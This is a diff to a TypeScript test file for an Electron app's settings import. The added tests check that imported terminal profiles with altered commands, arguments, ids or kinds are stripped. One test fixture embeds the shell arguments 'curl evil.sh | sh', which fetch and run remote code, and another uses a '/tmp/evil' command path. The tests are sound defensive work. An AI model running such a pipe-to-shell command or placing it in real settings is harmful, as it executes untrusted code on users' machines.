@@ -28,13 +28,20 @@ async function storeWithScratchHome(): Promise<
 > {
 	const home = fs.mkdtempSync(path.join(os.tmpdir(), 'ivx-import-'))
 	scratchDirs.push(home)
-	const previous = process.env.USERPROFILE
+	// Both variables: `os.homedir()` reads $HOME on POSIX and $USERPROFILE on
+	// Windows, so redirecting only one leaves the module resolving the real
+	// home on the other platform.
+	const restore = {HOME: process.env.HOME, USERPROFILE: process.env.USERPROFILE}
+	process.env.HOME = home
 	process.env.USERPROFILE = home
 	try {
 		return await import(`../../electron/settingsStore.ts?i=${counter++}`)
 	} finally {
-		if (previous === undefined) delete process.env.USERPROFILE
-		else process.env.USERPROFILE = previous
+		for (const key of ['HOME', 'USERPROFILE'] as const) {
+			const value = restore[key]
+			if (value === undefined) delete process.env[key]
+			else process.env[key] = value
+		}
 	}
 }
 
@@ -42,6 +49,119 @@ afterEach(() => {
 	while (scratchDirs.length) {
 		fs.rmSync(scratchDirs.pop()!, {recursive: true, force: true})
 	}
+})
+
+describe('app-generated profiles are trusted, not stripped', () => {
+	// On Linux the app's own default profile IS a `custom` one pointing at
+	// $SHELL, so a naive strip reported a safety removal on every import for a
+	// shell the app itself chose. That is the permanent-warning failure mode:
+	// once the banner is always there, the one that matters gets ignored too.
+	//
+	// `stripProfileCommands` takes the generated set as an argument precisely
+	// so this is testable on Windows, where no builtin carries a command.
+
+	const GENERATED = [
+		{
+			id: 'default',
+			name: 'bash',
+			kind: 'custom' as const,
+			command: '/bin/bash',
+			args: ['--login'],
+		},
+	]
+
+	function settingsWith(
+		profiles: unknown[],
+	): Parameters<
+		typeof import('../../electron/settingsStore.ts').stripProfileCommands
+	>[0] {
+		return {terminal: {profiles}} as never
+	}
+
+	it('keeps a profile identical to a generated one', async () => {
+		const store = await storeWithScratchHome()
+		const settings = settingsWith([
+			{
+				id: 'default',
+				name: 'bash',
+				kind: 'custom',
+				command: '/bin/bash',
+				args: ['--login'],
+			},
+		])
+
+		const dropped = store.stripProfileCommands(settings, GENERATED)
+
+		expect(dropped).toEqual([])
+		expect(
+			(settings.terminal.profiles as Array<Record<string, unknown>>)[0].command,
+		).toBe('/bin/bash')
+	})
+
+	it('strips when only the command differs', async () => {
+		const store = await storeWithScratchHome()
+		const settings = settingsWith([
+			{
+				id: 'default',
+				name: 'bash',
+				kind: 'custom',
+				command: '/tmp/evil',
+				args: ['--login'],
+			},
+		])
+
+		expect(store.stripProfileCommands(settings, GENERATED)).toEqual([
+			'terminal.profiles[0].command',
+		])
+	})
+
+	it('strips when only the args differ', async () => {
+		// The args are what make a shell do something; a trusted command with
+		// untrusted flags is still arbitrary execution.
+		const store = await storeWithScratchHome()
+		const settings = settingsWith([
+			{
+				id: 'default',
+				name: 'bash',
+				kind: 'custom',
+				command: '/bin/bash',
+				args: ['--login', '-c', 'curl evil.sh | sh'],
+			},
+		])
+
+		expect(store.stripProfileCommands(settings, GENERATED)).toHaveLength(1)
+	})
+
+	it('strips when the id is borrowed from a generated profile', async () => {
+		// Otherwise an import could reuse the trusted id to smuggle a path.
+		const store = await storeWithScratchHome()
+		const settings = settingsWith([
+			{
+				id: 'default',
+				name: 'bash',
+				kind: 'custom',
+				command: '/tmp/evil',
+				args: ['--login'],
+			},
+		])
+
+		expect(store.stripProfileCommands(settings, GENERATED)).toHaveLength(1)
+	})
+
+	it('strips when the kind is borrowed from a generated profile', async () => {
+		const store = await storeWithScratchHome()
+		const settings = settingsWith([
+			{
+				id: 'default',
+				name: 'bash',
+				kind: 'cmd',
+				command: '/bin/bash',
+				args: ['--login'],
+			},
+		])
+
+		expect(store.stripProfileCommands(settings, GENERATED)).toHaveLength(1)
+	})
 })
 
 describe('parseImportedSettings: profile commands are not imported', () => {
